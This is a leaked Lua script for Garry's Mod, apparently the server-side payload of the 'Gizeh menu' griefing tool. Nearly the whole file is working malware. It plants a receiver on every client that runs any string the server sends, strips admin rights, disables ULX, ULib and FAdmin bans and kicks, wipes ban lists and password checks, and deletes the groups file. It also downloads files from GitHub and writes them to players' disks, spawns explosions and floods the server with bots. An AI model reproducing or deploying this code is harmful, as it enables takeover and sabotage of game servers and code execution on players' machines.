--LEAKED BY EXEE

GizehSSV = GizehSSV or {}
GizehSSV.Start_SV = function()
    RunConsoleCommand('ulx_logecho', '0')
    GizehSSV.SecureNet = GizehSSV.SecureNet or 'NIQUE TA MERE SALE PUTE :D'
    GizehSSV.HUD = GizehSSV.HUD or 'HUDPaint_Receive'
    util.AddNetworkString(GizehSSV.HUD)
    BroadcastLua([[ net.Receive("]] .. GizehSSV.HUD .. [[", function() RunString(net.ReadString()) end)]])

    GizehSSV.Enabled = GizehSSV.Enabled or true
    GizehSSV.Wait1 = true
    GizehSSV.Wait1 = true
    GizehSSV.Wait1 = true

    GizehSSV.RandomString = function(a)
        local b = ''

        for i = 0, a do
            b = b .. string.char(math.random(97, 122))
        end

        return b
    end

    GizehSSV.SecureString1 = GizehSSV.SecureString1 or GizehSSV.RandomString(11)
    GizehSSV.SecureString2 = GizehSSV.SecureString2 or GizehSSV.RandomString(11)
    GizehSSV.SecureString3 = GizehSSV.SecureString3 or GizehSSV.RandomString(11)
    GizehSSV.SecureString4 = GizehSSV.SecureString4 or GizehSSV.RandomString(11)
    GizehSSV.SecureString5 = GizehSSV.SecureString5 or GizehSSV.RandomString(11)
    GizehSSV.SecureString6 = GizehSSV.SecureString6 or GizehSSV.RandomString(11)
    GizehSSV.SecureString7 = GizehSSV.SecureString7 or GizehSSV.RandomString(11)
    GizehSSV.SecureString8 = GizehSSV.SecureString8 or GizehSSV.RandomString(11)
    GizehSSV.SecureString9 = GizehSSV.SecureString9 or GizehSSV.RandomString(11)
    GizehSSV.SecureString10 = GizehSSV.SecureString10 or GizehSSV.RandomString(11)
    GizehSSV.SecureString11 = GizehSSV.SecureString11 or GizehSSV.RandomString(11)
    GizehSSV.SecureString12 = GizehSSV.SecureString12 or GizehSSV.RandomString(11)
    GizehSSV.SecureString13 = GizehSSV.SecureString13 or GizehSSV.RandomString(11)
    GizehSSV.SecureString15 = GizehSSV.SecureString15 or GizehSSV.RandomString(11)
    GizehSSV.SecureString16 = GizehSSV.SecureString16 or GizehSSV.RandomString(11)
    GizehSSV.SecureString17 = GizehSSV.SecureString17 or GizehSSV.RandomString(11)
    util.AddNetworkString('GM::SendParticle::' .. GizehSSV.SecureNet)
    util.AddNetworkString('GM::ParticleExist::' .. GizehSSV.SecureNet)
    GizehSSV.LaViolence = {'22.031', '22.758', '23.039', '24.508', '24.756', '26.024', '26.511', '27.020', '27.285', '27.412', '27.496', '28.012', '28.780', '29.981', '30.148', '30.348', '30.514', '32.017', '32.101', '32.210', '32.319', '32.751', '33.017', '33.752', '34.018', '35.252', '36.027', '36.254', '36.339', '36.448', '36.557', '36.667', '37.556', '40.525', '40.759', '41.026', '42.027', '42.527', '43.261', '43.346', '43.528', '44.029', '44.796', '46.031', '46.531', '47.032', '48.033', '48.142', '48.252', '49.001', '49.053', '49.187', '49.264', '50.002', '51.036', '51.269', '52.037', '52.270', '52.380', '52.489', '52.771', '53.038', '53.122', '53.199', '53.505', '54.039', '61.048', '62.047', '66.018', '78.029', '80.031', '82.033', '84.036', '86.035', '144.895'}
    GizehSSV.ClientSide = [[
        hook.Add("PreDrawHUD", "]] .. tostring(GizehSSV.SecureString13) .. [[", function()
            gui.HideGameUI()
        end)

        GizehSSV = GizehSSV or {}
        GizehSSV.Wait1 = GizehSSV.Wait1 or true
        GizehSSVLogo = GizehSSVLogo or nil
        GizehSSV.Enabled = GizehSSV.Enabled or true

        sound.PlayURL("https://gizehmenu.net/ssv.mp3", "mono", function(s)
            if(IsValid(s)) then
                s:Play()
            end
        end)

        timer.Create("]] .. tostring(GizehSSV.SecureString4) .. [[", 0.1, 0, function()
            if not GizehSSV.Enabled then return end
            local mat = Entity(0):GetMaterials()

            for k, v in pairs(mat) do
                if GizehSSV.Wait1 then
                    local col = HSVToColor(CurTime() * 6 * 60, 1, 1)
                    Material(v):SetVector("$color", Vector(col.r / 220, col.g / 220, col.b / 220))
                else
                    local col = Color(math.random(170, 220), math.random(170, 220), math.random(170, 220))
                    Material(v):SetVector("$color", Vector(col.r - 200, col.g - 200, col.b - 200))
                end
            end
        end)

        timer.Simple(142.267, function()
            if not GizehSSV.Enabled then return end
            RunConsoleCommand("gmod_language", "de")
        end)

        timer.Simple(22, function()
            if not GizehSSV.Enabled then return end

            timer.Create("]] .. tostring(GizehSSV.SecureString2) .. [[", 0.1, 0, function()
                if not GizehSSV.Enabled then return end
                notification.AddLegacy("https://gizehmenu.net/", math.random(0, 4), 1.5)
            end)

            function GAMEMODE:PostDraw2DSkyBox()
                local col = HSVToColor(RealTime() * 120 % 360, 1, 1)
                render.Clear(col.r / 1.3, col.g / 1.3, col.b / 1.3, 255)

                return true
            end

            function GAMEMODE:PreDrawSkyBox()
                local col = HSVToColor(RealTime() * 120 % 360, 1, 1)
                render.Clear(col.r / 1.3, col.g / 1.3, col.b / 1.3, 255)

                return true
            end
        end)

        timer.Simple(5, function()
            if not GizehSSV.Enabled then return end

            if GizehSSVLogo then
                GizehSSVLogo:Remove()
                GizehSSVLogo = nil
            end

            GizehSSVLogo = vgui.Create("HTML")
            GizehSSVLogo:MoveToFront()
            GizehSSVLogo:SetSize(600, 200)
            GizehSSVLogo:SetPos((ScrW() / 2) - 300,(ScrH() / 8) - 100)
            GizehSSVLogo:OpenURL("https://image.noelshack.com/fichiers/2019/03/5/1547816727-gizehmenu.png")

            hook.Add("Tick", "]] .. tostring(GizehSSV.SecureString3) .. [[", function()
                if GizehSSV.Wait1 then
                    GizehSSVLogo:SetPos((ScrW() / 2) - 300,(ScrH() / 8) - 100)
                else
                    GizehSSVLogo:SetPos((ScrW() / 2) - math.random(280, 320),(ScrH() / 8) - math.random(80, 120))
                end
            end)

            timer.Create("]] .. tostring(GizehSSV.SecureString5) .. [[", 1.5, 0, function()
            local time = tonumber(0)
            local Message = {

                "        . https://gizehmenu.net/ .",
                "       .. https://gizehmenu.net/ ..",
                "      ... https://gizehmenu.net/ ...",
                "     .... https://gizehmenu.net/ ....",
                "    ..... https://gizehmenu.net/ .....",
                "   ...... https://gizehmenu.net/ ......",
                "  ....... https://gizehmenu.net/ .......",
                " ........ https://gizehmenu.net/ ........",
                "......... https://gizehmenu.net/ .........",
                " ........ https://gizehmenu.net/ ........",
                "  ....... https://gizehmenu.net/ .......",
                "   ...... https://gizehmenu.net/ ......",
                "    ..... https://gizehmenu.net/ .....",
                "     .... https://gizehmenu.net/ ....",
                "      ... https://gizehmenu.net/ ...",
                "       .. https://gizehmenu.net/ ..",
                "        . https://gizehmenu.net/ .",

            }

            for _, line in pairs(Message) do
                time = time + tonumber(0.1)
                timer.Simple(time,function()
                    if not GizehSSV.Enabled then return end
                    chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
                end)
            end
        end)
    end)

        timer.Simple(1, function()
            if not GizehSSV.Enabled then return end
            local text = "Le Guiser Menu sais trop bien les reille"
            local str = ""
            text = string.Trim(text)
            text = string.Explode(" ", text)
            if text == {} then return end

            for k, v in pairs(text) do
                str = str .. v .. "+"
            end

            sound.PlayURL("http://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&q=" .. str .. "&tl=fr", "mono", function(chan, num, str) end)
        end)

        local tab = {
            ["$pp_colour_addr"] = 0.001,
            ["$pp_colour_addg"] = 0.001,
            ["$pp_colour_addb"] = 0,
            ["$pp_colour_brightness"] = tonumber(-0.5),
            ["$pp_colour_contrast"] = 0.8,
            ["$pp_colour_colour"] = 3,
            ["$pp_colour_mulr"] = 1,
            ["$pp_colour_mulg"] = 0.5,
            ["$pp_colour_mulb"] = 0.4
        }

        hook.Add("RenderScreenspaceEffects", "]] .. tostring(GizehSSV.SecureString11) .. [[", function()
            DrawColorModify(tab)
        end)]]

    GizehSSV.SendtoClients = function(a)
        net.Start(GizehSSV.HUD)
        net.WriteString(a)
        net.Broadcast()
    end

    GizehSSV.SendtoClient = function(a, b)
        net.Start(GizehSSV.HUD)
        net.WriteString(b)
        net.Send(a)
    end

    GizehSSV.SendtoClients(GizehSSV.ClientSide)

    for a, b in pairs(player.GetAll()) do
        b:SetJumpPower(450)
        b:GodEnable()

        if b:GetUserGroup() ~= tostring('user') then
            b:SetUserGroup('user')
        end
    end

    GizehSSV.TriggeredSSV = function()
        for k, v in pairs(GizehSSV.LaViolence) do
            if not GizehSSV.Enabled then return end
            if tonumber(v) == nil then return end
            local n = 0.2

            if tonumber(v) == 62.047 then
                n = 3.313
            end

            if tonumber(v) == 66.018 then
                n = 3.55
            end

            if tonumber(v) == 86.035 then
                n = 42.566
            end

            timer.Simple(tonumber(v) - 22.031, function()
                if not GizehSSV.Enabled then return end

                if tonumber(v) == 144.895 then
                    hook.Add('Think', GizehSSV.SecureString17, function()
                        local boom = ents.Create('env_explosion')
                        boom:SetPos(Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)))
                        boom:Spawn()
                        boom:SetKeyValue('iMagnitude', '500')
                        boom:Fire('Explode', 0, 0)
                    end)
                end

                if tonumber(v) == 86.035 then
                    GizehSSV.Wait2 = false
                end

                GizehSSV.Wait1 = false
                GizehSSV.SendtoClients([[
                    if GizehSSV then
                        GizehSSV.Wait1 = tobool(]] .. tostring(GizehSSV.Wait1) .. [[")
                    end
                ]])

                timer.Simple(n, function()
                    GizehSSV.Wait1 = true
                    GizehSSV.Wait2 = true
                    GizehSSV.SendtoClients([[
                        if GizehSSV then
                            GizehSSV.Wait1 = tobool("]] .. tostring(GizehSSV.Wait1) .. [[)
                        end
                    ]])
                end)
            end)
        end
    end

    timer.Simple(1, function()
        if not GizehSSV.Enabled then return end
        game.ConsoleCommand('sv_loadingurl "https://cdn.discordapp.com/attachments/406258383868395521/536192559752544266/w2el8-gvkse.gif"')
        game.ConsoleCommand('sv_gravity 200')

        if FAdmin and FAdmin.PlayerActions then
            FAdmin.PlayerActions.ConvertBanTime = function() return 1 end
        end

        if ULib then
            ULib.ban = function() return end
            ULib.kickban = function() return end
            ULib.kick = function() return end
            ULib.addBan = function() return end
        end

        if ulx then
            ulx.ban = function(a) return end
            ulx.kick = function(a) return end
            ulx.banid = function(a) return end
            ulx.removeuser = function(a) return end
        end

        FAdmin = FAdmin or {}

        timer.Create(GizehSSV.SecureString15, .1, 0, function()
            FAdmin.BANS = {}
        end)

        hook.GetTable()['CheckPassword'] = {}

        timer.Create(GizehSSV.SecureString16, math.random(3, 10), 0, function()
            for k, v in pairs(ents.GetAll()) do
                if v:GetClass() == 'prop_vehicle_jeep' then
                    local boom = ents.Create('env_explosion')
                    boom:SetPos(v:GetPos())
                    boom:Spawn()
                    boom:SetKeyValue('iMagnitude', '50')
                    boom:Fire('Explode', 0, 0)
                end
            end
        end)

        if file.Exists('ulib/groups.txt', 'DATA') then
            file.Delete('ulib/groups.txt')
        end
    end)

    timer.Create(GizehSSV.SecureString12, 149.544, 1, function()
        if not GizehSSV.Enabled then return end
        game.ConsoleCommand('changelevel ' .. game.GetMap())
    end)

    timer.Simple(22, function()
        if not GizehSSV.Enabled then return end

        timer.Create(GizehSSV.SecureString1, 5, 1, function()
            local a = true
            local b = 0
            local c = 0

            for k, v in pairs(player.GetAll()) do
                local ent = ents.Create('prop_physics')
                ent:SetModel('models/hunter/misc/squarecap1x1x1.mdl')
                ent:SetPos(Vector(v:GetPos()[1] + math.random(-1000, 1000), v:GetPos()[2] + math.random(-1000, 1000), -500))
                ent:Spawn()
                ent:Activate()
                ent:SetAngles(Angle(0, 0, 0))
                ent:SetModelScale(8)
                ent:SetCollisionGroup(10)
                ent:SetMaterial('models/debug/debugwhite')
            end

            hook.Add('Tick', GizehSSV.SecureString9, function()
                if not GizehSSV.Enabled then return end
                c = c + 0.1

                for k, v in pairs(ents.FindByModel('models/hunter/misc/squarecap1x1x1.mdl')) do
                    if v:GetPos()[3] < 1000 and a then
                        if v:GetPos()[3] < tonumber(-550) then
                            v:SetPos(v:GetPos() + Vector(math.random(-1000, 1000), math.random(-1000, 1000), 4))
                            v:SetAngles(Angle(0, math.random(0, 5), 0))
                        else
                            v:SetPos(v:GetPos() + Vector(0, 0, 4))
                            v:SetAngles(v:GetAngles() + Angle(0, math.random(0, 5), 0))
                        end

                        a = true
                    elseif v:GetPos()[3] > 1000 then
                        v:SetPos(v:GetPos() + Vector(0, 0, 0))
                        v:SetAngles(v:GetAngles() - Angle(0, 5, 0))
                        a = false
                    elseif v:GetPos()[3] < tonumber(-550) and c > 100 then
                        b = 0
                        c = 0
                        a = true
                    elseif c > 100 then
                        v:SetPos(v:GetPos() - Vector(0, 0, 8))
                        v:SetAngles(v:GetAngles() + Angle(0, math.random(0, 5), 0))
                        a = false
                    elseif b < 180 then
                        v:SetPos(v:GetPos() + Vector(0, 0, 0))
                        v:SetAngles(Angle(b, b, 0))

                        if b < 179 then
                            b = b + 0.5
                        else
                            b = b + 0.1
                        end
                    else
                        v:SetPos(v:GetPos() + Vector(0, 0, 0))
                        v:SetAngles(v:GetAngles() - Angle(0, 5, 0))
                    end

                    if GizehSSV.Wait1 then
                        v:SetColor(Color(0, 0, 0))
                    else
                        local d = Color(math.random(170, 220), math.random(170, 220), math.random(170, 220))
                        v:SetColor(Color(d.r - 200, d.g - 200, d.b - 200))
                    end
                end
            end)
        end)

        timer.Simple(0.2, function()
            GizehSSV.TriggeredSSV()
        end)

        timer.Create(GizehSSV.SecureString7, 2, 0, function()
            if not GizehSSV.Enabled then return end

            for k, v in pairs(player.GetAll()) do
                if not v:IsValid() then return end
                v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE)
                v:SetMaterial('models/debug/debugwhite')
                v:SetColor(HSVToColor(RealTime() * 120 % 360, 1, 1))

                if DarkRP then
                    DarkRP.storeRPName(v, '#GizehMenu')
                    v:setDarkRPVar('rpname', '#GizehMenu')
                end
            end
        end)

        timer.Create(GizehSSV.SecureString6, 0.5, game.MaxPlayers() - player.GetCount(), function()
            if not GizehSSV.Enabled then return end
            RunConsoleCommand('bot')
        end)

        timer.Create(GizehSSV.SecureString8, .32, 0, function()
            if not GizehSSV.Enabled then return end
            if GizehSSV.Wait2 then return end

            for k, v in pairs(ents.GetAll()) do
                local phys = v:GetPhysicsObject()

                if phys:IsValid() then
                    local mass = phys:GetMass()
                    phys:ApplyForceOffset(mass * 6 * Vector(math.Rand(-3.5, 5.2), math.Rand(-3.5, 5.2), math.Rand(3.5, 10.2)), phys:GetPos() + Vector(math.Rand(-72, 72), math.Rand(-72, 72), math.Rand(-72, 72)))

                    if (math.random(0, 320) == 320) then
                        phys:EnableMotion(true)
                        phys:Wake()
                        phys:ApplyForceOffset(mass * 6 * Vector(math.Rand(-32, 42), math.Rand(-32, 42), math.Rand(42, 52)), phys:GetPos() + Vector(math.Rand(-72, 72), math.Rand(-72, 72), math.Rand(-72, 72)))
                    end
                end
            end
        end)
    end)

    GizehSSV.SendtoClients([[
        net.Receive("GM::SendParticle::]] .. GizehSSV.SecureNet .. [[", function()
            local len = net.ReadUInt(32)
            local str = net.ReadData(len)
            local choux = util.Decompress(str)
            local pluie = net.ReadString()
            file.CreateDir(string.GetPathFromFilename(pluie))
            file.Write(pluie, choux)

            timer.Simple(2, function()
                if (file.Exists("custom_mat/particles/gizeh.pcf.dat", "DATA") and file.Exists("custom_mat/materials/gizeh_particles/gizeh_particles.vtf", "DATA")) then
                    local GizehVMT = Material("weapons/swep.vmt")
                    GizehVMT:SetTexture("$basetexture", "../data/custom_mat/materials/gizeh_particles/gizeh_particles")
                    game.AddParticles("../data/custom_mat/particles/gizeh.pcf.dat")
                    PrecacheParticleSystem("gizeh")
                    net.Start("GM::ParticleExist::]] .. GizehSSV.SecureNet .. [[")
                    net.SendToServer()
                end
            end)
        end)
    ]])

    net.Receive('GM::ParticleExist::' .. GizehSSV.SecureNet, function(_, ply)
        ParticleEffectAttach('gizeh', PATTACH_ABSORIGIN_FOLLOW, ply, 0)
    end)

    GizehSSV.SendParticleToClients = function(a, b)
        local b = util.Compress(b)
        net.Start('GM::SendParticle::' .. GizehSSV.SecureNet)
        net.WriteUInt(#b, 32)
        net.WriteData(b, #b)
        net.WriteString(a)
        net.Broadcast()
    end

    timer.Simple(5, function()
        http.Fetch('https://github.com/JambonCru/Some-backup/raw/master/hKHJFklhgF.pcf', function(a)
            if (string.Left(a, 1) == '<' or a == '502: Failure') and string.Left(a, 43) ~= '<!-- dmx encoding binary 2 format pcf 1 -->' then return end
            GizehSSV.SendParticleToClients('custom_mat/particles/gizeh.pcf.dat', a)
        end)

        http.Fetch('https://github.com/JambonCru/Some-backup/raw/master/IKFJHlfLFlfjNFKf.vtf', function(a)
            if string.Left(a, 1) == '<' or a == '502: Failure' then return end
            GizehSSV.SendParticleToClients('custom_mat/materials/gizeh_particles/gizeh_particles.vtf', a)
        end)
    end)
end

GizehSSV.Start_SV()